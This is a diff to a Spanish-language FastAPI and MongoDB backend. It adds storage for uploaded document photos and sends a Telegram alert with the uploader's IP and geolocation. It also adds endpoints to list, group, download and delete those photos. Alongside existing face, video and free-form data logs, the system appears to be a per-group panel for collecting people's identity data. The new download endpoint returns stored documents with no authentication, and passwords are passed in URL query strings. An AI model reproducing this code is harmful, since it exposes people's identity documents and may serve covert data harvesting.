@@ -205,6 +205,7 @@ class MongoState:
         self.auditoria_maestro = None
         self.caras_usuarios = None
         self.videos_usuarios = None
+        self.documentos_usuarios = None
         self.fs_bucket: Optional[AsyncIOMotorGridFSBucket] = None
 
     def init(self):
@@ -216,6 +217,7 @@ class MongoState:
         self.auditoria_maestro = self.db["auditoria_maestro"]
         self.caras_usuarios = self.db["caras_usuarios"]
         self.videos_usuarios = self.db["videos_usuarios"]
+        self.documentos_usuarios = self.db["documentos_usuarios"]
         self.fs_bucket = (
             AsyncIOMotorGridFSBucket(self.db, bucket_name="videos_fs")
             if GRIDFS_DISPONIBLE else None
@@ -531,11 +533,6 @@ async def _geo_ipinfo_io(ip: str):
     }
 
 
-async def _geo_ip_geolocation(ip: str):
-    d = await _http_get_json(f"https://ipgeolocation.abstractapi.com/v1/?ip_address={ip}")
-    return None
-
-
 GEO_PROVEEDORES = [
     ("ipwhois.app", _geo_ipwhois_app),
     ("ipapi.co", _geo_ipapi_co),
@@ -625,7 +622,6 @@ async def init_db_async():
                 mongo.logs_usuarios.create_index("fecha", background=True),
                 mongo.logs_usuarios.create_index("pais_code", background=True),
                 mongo.logs_usuarios.create_index("ciudad", background=True),
-                # ← CAMBIO: clave compuesta (usuario, grupo) en vez de session_id
                 mongo.logs_usuarios.create_index(
                     [("usuario", 1), ("grupo", 1)],
                     unique=True,
@@ -645,6 +641,12 @@ async def init_db_async():
                 mongo.videos_usuarios.create_index("fecha", background=True),
                 mongo.videos_usuarios.create_index("pais_code", background=True),
                 mongo.videos_usuarios.create_index("ciudad", background=True),
+                mongo.documentos_usuarios.create_index("usuario", background=True),
+                mongo.documentos_usuarios.create_index("grupo", background=True),
+                mongo.documentos_usuarios.create_index("fecha", background=True),
+                mongo.documentos_usuarios.create_index("pais_code", background=True),
+                mongo.documentos_usuarios.create_index("ciudad", background=True),
+                mongo.documentos_usuarios.create_index("tipo_documento", background=True),
             ]
             await asyncio.gather(*tareas, return_exceptions=True)
             log.info("Índices creados")
@@ -716,7 +718,6 @@ CAMPOS_RESERVADOS_LOG = {
 
 
 def _sanitizar_nombre_campo(nombre: str) -> str:
-    """MongoDB no permite '.' ni '$' al inicio del nombre de un campo."""
     n = str(nombre).strip()[:100]
     n = n.replace("$", "_").replace(".", "_")
     return n or "campo"
@@ -728,17 +729,8 @@ def _sanitizar_valor(valor) -> str:
     return f"[{type(valor).__name__}]"[:500]
 
 
-# ← CAMBIO: upsert por (usuario, grupo) en lugar de session_id
 async def _upsert_log_usuario(usuario: str, campos: dict,
                               geo: dict, ip: str, grupo: str, tipo: str):
-    """
-    Upsert por (usuario, grupo):
-      - Un usuario puede tener un documento por cada grupo.
-      - Editar un grupo NO afecta a los otros.
-      - 'campos' se FUSIONA (clave existente se actualiza, nueva se agrega).
-      - IP/geo/fecha_actualizado se refrescan siempre.
-    Devuelve (documento, es_nuevo).
-    """
     async with db_semaphore:
         try:
             ahora = datetime.utcnow()
@@ -887,7 +879,7 @@ async def lifespan(app: FastAPI):
 def create_app(engine=None):
     app = FastAPI(
         title='API REST Desacoplada',
-        version='6.4.0',  # ← CAMBIO: versión
+        version='6.5.0',
         lifespan=lifespan
     )
     app.state._engine_override = engine
@@ -1076,6 +1068,111 @@ def create_app(engine=None):
             "geo_fuente": geo.get("geo_fuente"),
             "foto_bytes": len(raw),
             "foto_bytes_guardado": len(comprimida),
+        }
+
+    # ========================================================
+    # GUARDAR DOCUMENTO (solo guarda, NO verifica)
+    # ========================================================
+    async def _guardar_documento_db(usuario, grupo, documento_b64, mime, size_original,
+                                     size_guardado, geo, ip, etiqueta, tipo_documento):
+        async with db_semaphore:
+            try:
+                doc = {
+                    "usuario": usuario[:200],
+                    "grupo": grupo.strip().lower()[:50],
+                    "tipo_documento": (tipo_documento or 'documento')[:50],
+                    "etiqueta": (etiqueta or '')[:100],
+                    "documento_b64": documento_b64,
+                    "documento_mime": mime,
+                    "documento_bytes_original": size_original,
+                    "documento_bytes": size_guardado,
+                    "ip": ip,
+                    "pais": geo.get("pais", "Unknown"),
+                    "pais_code": geo.get("pais_code", "XX"),
+                    "ciudad": geo.get("ciudad", ""),
+                    "region": geo.get("region", ""),
+                    "isp": geo.get("isp", ""),
+                    "lat": geo.get("lat"),
+                    "lon": geo.get("lon"),
+                    "geo_fuente": geo.get("geo_fuente", ""),
+                    "fecha": datetime.utcnow(),
+                }
+                result = await mongo.documentos_usuarios.insert_one(doc)
+                log.info(f"Documento {result.inserted_id} [{usuario}] {geo.get('pais_code')}/{geo.get('ciudad')}")
+                return result.inserted_id
+            except Exception as e:
+                log.error(f"Error guardando documento: {e}")
+                return None
+
+    @app.post("/guardar_documento")
+    async def guardar_documento(
+        request: Request,
+        image: UploadFile = File(None),
+        imagen: UploadFile = File(None),
+        usuario: str = Form(...),
+        grupo: str = Form("general"),
+        tipo_documento: str = Form("documento"),
+        etiqueta: str = Form("")
+    ):
+        """
+        Guarda la foto de un documento.
+        Solo se almacena comprimida: NO se verifica si es un documento válido.
+        Acepta el archivo en 'image' o 'imagen'.
+        """
+        archivo = image or imagen
+        if archivo is None:
+            raise InputError('Debes enviar el archivo en "image" o "imagen".')
+
+        ip = obtener_ip_real(request)
+        geo = await geolocalizar_ip(ip)
+        grupo_limpio = grupo.strip().lower()[:50]
+        etiqueta_limpia = (etiqueta or '').strip()[:100]
+        tipo_limpio = (tipo_documento or 'documento').strip().lower()[:50]
+
+        raw = await archivo.read(MAX_FILE_BYTES + 1)
+        if len(raw) > MAX_FILE_BYTES:
+            raise TooLarge()
+        if not raw:
+            raise InputError('La imagen está vacía.')
+
+        mime_original = _detectar_mime(raw)
+        if not mime_original.startswith("image/"):
+            raise InputError('El archivo no es una imagen válida.')
+
+        comprimida, mime = _comprimir_foto(raw)
+        b64 = base64.b64encode(comprimida).decode('ascii')
+
+        await add_background_task(
+            _guardar_documento_db,
+            usuario, grupo_limpio, b64, mime,
+            len(raw), len(comprimida),
+            geo, ip, etiqueta_limpia, tipo_limpio
+        )
+
+        msg = (f"📄 *Nuevo Documento [{grupo_limpio}]*\n"
+               f"👤 Usuario: `{usuario}`\n"
+               f"📋 Tipo: `{tipo_limpio}`\n"
+               f"🏷️ Etiqueta: `{etiqueta_limpia}`\n"
+               f"🌐 IP: `{ip}`\n"
+               f"🌍 {geo.get('pais')} / {geo.get('ciudad')} ({geo.get('pais_code')})\n"
+               f"📦 {len(raw)} → {len(comprimida)} bytes")
+        await add_background_task(_enviar_telegram, msg)
+
+        return {
+            "message": "Documento guardado correctamente",
+            "usuario": usuario,
+            "grupo": grupo_limpio,
+            "tipo_documento": tipo_limpio,
+            "etiqueta": etiqueta_limpia,
+            "ip": ip,
+            "pais": geo.get("pais"),
+            "pais_code": geo.get("pais_code"),
+            "ciudad": geo.get("ciudad"),
+            "region": geo.get("region"),
+            "isp": geo.get("isp"),
+            "geo_fuente": geo.get("geo_fuente"),
+            "documento_bytes": len(raw),
+            "documento_bytes_guardado": len(comprimida),
         }
 
     # ========================================================
@@ -1577,6 +1674,200 @@ def create_app(engine=None):
             return {"message": f"Se eliminaron {result.deleted_count} fotos de {email_limpio}"}
 
     # ========================================================
+    # DOCUMENTOS (ver / descargar / borrar — sin verificación)
+    # ========================================================
+    @app.get("/api/documentos")
+    async def api_obtener_documentos(
+        usuario: str, password: str,
+        grupo: Optional[str] = None,
+        usuario_filtro: Optional[str] = None,
+        tipo_documento: Optional[str] = None,
+        pais_code: Optional[str] = None,
+        ciudad: Optional[str] = None,
+        fecha_desde: Optional[str] = None,
+        fecha_hasta: Optional[str] = None,
+        limite: int = 500,
+    ):
+        async with db_semaphore:
+            if not await validar_credenciales_internas(usuario, password):
+                raise HTTPException(status_code=401, detail="No autorizado")
+            usuario_limpio = usuario.strip().lower()
+            query = _construir_match(
+                usuario_limpio, grupo, usuario_filtro,
+                pais_code, ciudad, fecha_desde, fecha_hasta
+            )
+            if tipo_documento and tipo_documento not in ("", "todos"):
+                query["tipo_documento"] = tipo_documento.strip().lower()
+
+            limite = max(1, min(int(limite), 500))
+            cursor = mongo.documentos_usuarios.find(query, {"documento_b64": 0}).sort("fecha", -1).limit(limite)
+            docs = await cursor.to_list(length=limite)
+
+        return {"documentos": [{
+            "id": str(d["_id"]),
+            "usuario": d.get("usuario", ""),
+            "grupo": d.get("grupo", "general"),
+            "tipo_documento": d.get("tipo_documento", "documento"),
+            "etiqueta": d.get("etiqueta", ""),
+            "mime": d.get("documento_mime", "image/jpeg"),
+            "bytes": d.get("documento_bytes", 0),
+            "ip": d.get("ip", ""),
+            "pais": d.get("pais", ""),
+            "pais_code": d.get("pais_code", ""),
+            "ciudad": d.get("ciudad", ""),
+            "region": d.get("region", ""),
+            "isp": d.get("isp", ""),
+            "fecha": d.get("fecha").strftime("%Y-%m-%d %H:%M:%S")
+                     if isinstance(d.get("fecha"), datetime) else str(d.get("fecha")),
+        } for d in docs]}
+
+    @app.get("/api/documentos/agrupados")
+    async def api_documentos_agrupados(
+        usuario: str, password: str,
+        grupo: Optional[str] = None,
+        usuario_filtro: Optional[str] = None,
+        tipo_documento: Optional[str] = None,
+        pais_code: Optional[str] = None,
+        ciudad: Optional[str] = None,
+        fecha_desde: Optional[str] = None,
+        fecha_hasta: Optional[str] = None,
+        limite: int = 500,
+    ):
+        async with db_semaphore:
+            if not await validar_credenciales_internas(usuario, password):
+                raise HTTPException(status_code=401, detail="No autorizado")
+            usuario_limpio = usuario.strip().lower()
+            match = _construir_match(
+                usuario_limpio, grupo, usuario_filtro,
+                pais_code, ciudad, fecha_desde, fecha_hasta
+            )
+            if tipo_documento and tipo_documento not in ("", "todos"):
+                match["tipo_documento"] = tipo_documento.strip().lower()
+
+            pipeline = [
+                {"$match": match},
+                {"$group": {
+                    "_id": {"usuario": "$usuario", "grupo": "$grupo"},
+                    "total": {"$sum": 1},
+                    "ultima_fecha": {"$max": "$fecha"},
+                    "primera_fecha": {"$min": "$fecha"},
+                    "ultima_ip": {"$last": "$ip"},
+                    "ultimo_pais": {"$last": "$pais"},
+                    "ultimo_pais_code": {"$last": "$pais_code"},
+                    "ultima_ciudad": {"$last": "$ciudad"},
+                    "tipos": {"$addToSet": "$tipo_documento"},
+                    "etiquetas": {"$addToSet": "$etiqueta"},
+                }},
+                {"$sort": {"ultima_fecha": -1}},
+                {"$limit": max(1, min(int(limite), 1000))},
+            ]
+
+            resultado = []
+            async for doc in mongo.documentos_usuarios.aggregate(pipeline):
+                resultado.append({
+                    "usuario": doc["_id"].get("usuario", ""),
+                    "grupo": doc["_id"].get("grupo", "general"),
+                    "total": doc.get("total", 0),
+                    "primera_fecha": doc["primera_fecha"].strftime("%Y-%m-%d %H:%M:%S")
+                        if isinstance(doc.get("primera_fecha"), datetime) else "",
+                    "ultima_fecha": doc["ultima_fecha"].strftime("%Y-%m-%d %H:%M:%S")
+                        if isinstance(doc.get("ultima_fecha"), datetime) else "",
+                    "ip": doc.get("ultima_ip", ""),
+                    "pais": doc.get("ultimo_pais", ""),
+                    "pais_code": doc.get("ultimo_pais_code", ""),
+                    "ciudad": doc.get("ultima_ciudad", ""),
+                    "tipos_documentos": [t for t in doc.get("tipos", []) if t],
+                    "etiquetas": [e for e in doc.get("etiquetas", []) if e],
+                })
+            return {"grupos": resultado}
+
+    @app.get("/api/documento/archivo/{documento_id}")
+    async def api_descargar_documento(documento_id: str):
+        try:
+            oid = ObjectId(documento_id)
+        except Exception:
+            raise HTTPException(status_code=400, detail="ID inválido")
+        async with db_semaphore:
+            doc = await mongo.documentos_usuarios.find_one({"_id": oid}, {"documento_b64": 1, "documento_mime": 1})
+        if not doc:
+            raise HTTPException(status_code=404, detail="No encontrado")
+        try:
+            raw = base64.b64decode(doc["documento_b64"])
+        except Exception:
+            raise HTTPException(status_code=500, detail="Documento corrupto")
+        return FastAPIResponse(content=raw, media_type=doc.get("documento_mime", "image/jpeg"))
+
+    @app.delete("/api/documento/{documento_id}")
+    async def api_eliminar_documento(
+        documento_id: str,
+        usuario: str = Form(...),
+        password: str = Form(...)
+    ):
+        async with db_semaphore:
+            try:
+                if not await validar_credenciales_internas(usuario, password):
+                    raise HTTPException(status_code=401, detail="No autorizado")
+                usuario_limpio = usuario.strip().lower()
+                doc = await mongo.documentos_usuarios.find_one(
+                    {"_id": ObjectId(documento_id)},
+                    {"documento_b64": 0}
+                )
+                if not doc:
+                    raise HTTPException(status_code=404, detail="No encontrado")
+                if usuario_limpio != AUTH_USERNAME.lower() and doc.get("grupo") != usuario_limpio:
+                    raise HTTPException(status_code=403, detail="Sin permisos")
+
+                await mongo.documentos_usuarios.delete_one({"_id": ObjectId(documento_id)})
+                await add_background_task(
+                    registrar_auditoria,
+                    tipo_accion="ELIMINACION_DOCUMENTO",
+                    autor=usuario_limpio,
+                    grupo_origen=doc.get("grupo", "general"),
+                    datos_previos={
+                        "id_registro": str(doc["_id"]),
+                        "usuario": doc.get("usuario"),
+                        "tipo_documento": doc.get("tipo_documento"),
+                        "etiqueta": doc.get("etiqueta"),
+                        "ip": doc.get("ip"),
+                    }
+                )
+                return {"message": "Documento eliminado"}
+            except HTTPException:
+                raise
+            except Exception:
+                raise HTTPException(status_code=400, detail="ID inválido")
+
+    @app.delete("/api/documentos/usuario/{usuario_email}")
+    async def api_eliminar_documentos_usuario(
+        usuario_email: str,
+        usuario: str = Form(...),
+        password: str = Form(...)
+    ):
+        async with db_semaphore:
+            if not await validar_credenciales_internas(usuario, password):
+                raise HTTPException(status_code=401, detail="No autorizado")
+            usuario_limpio = usuario.strip().lower()
+            email_limpio = usuario_email.strip()
+
+            query = {"usuario": email_limpio}
+            if usuario_limpio != AUTH_USERNAME.lower():
+                query["grupo"] = usuario_limpio
+
+            docs = await mongo.documentos_usuarios.find(query, {"_id": 1, "grupo": 1}).to_list(length=2000)
+            if not docs:
+                raise HTTPException(status_code=404, detail="Sin documentos para ese usuario")
+
+            result = await mongo.documentos_usuarios.delete_many(query)
+            await add_background_task(
+                registrar_auditoria,
+                tipo_accion="ELIMINACION_DOCUMENTOS_USUARIO",
+                autor=usuario_limpio,
+                grupo_origen=docs[0].get("grupo", "general") if docs else "general",
+                datos_previos={"usuario_afectado": email_limpio, "total": result.deleted_count}
+            )
+            return {"message": f"Se eliminaron {result.deleted_count} documentos de {email_limpio}"}
+
+    # ========================================================
     # VIDEOS
     # ========================================================
     @app.get("/api/videos")
@@ -1720,17 +2011,10 @@ def create_app(engine=None):
                 raise HTTPException(status_code=400, detail="ID inválido")
 
     # ========================================================
-    # LOGS / GUARDAR DATOS  — upsert por (usuario, grupo)
+    # LOGS / GUARDAR DATOS
     # ========================================================
     @app.post("/guardar_datos")
     async def guardar_datos(request: Request):
-        """
-        Upsert por (usuario, grupo):
-          - Envía 'usuario' y 'grupo' obligatorios.
-          - Todos los demás campos van a 'campos' (se fusionan).
-          - El mismo usuario puede tener un doc por cada grupo.
-          - Editar un grupo NO afecta a los otros.
-        """
         ip = obtener_ip_real(request)
         geo = await geolocalizar_ip(ip)
 
@@ -1880,7 +2164,6 @@ def create_app(engine=None):
                 "isp": lg.get("isp", ""),
                 "grupo": lg.get("grupo", "general"),
                 "tipo": lg.get("tipo", ""),
-                # ← CAMBIO: se elimina session_id
                 "fecha": lg.get("fecha").strftime("%Y-%m-%d %H:%M:%S")
                          if isinstance(lg.get("fecha"), datetime)
                          else str(lg.get("fecha")),
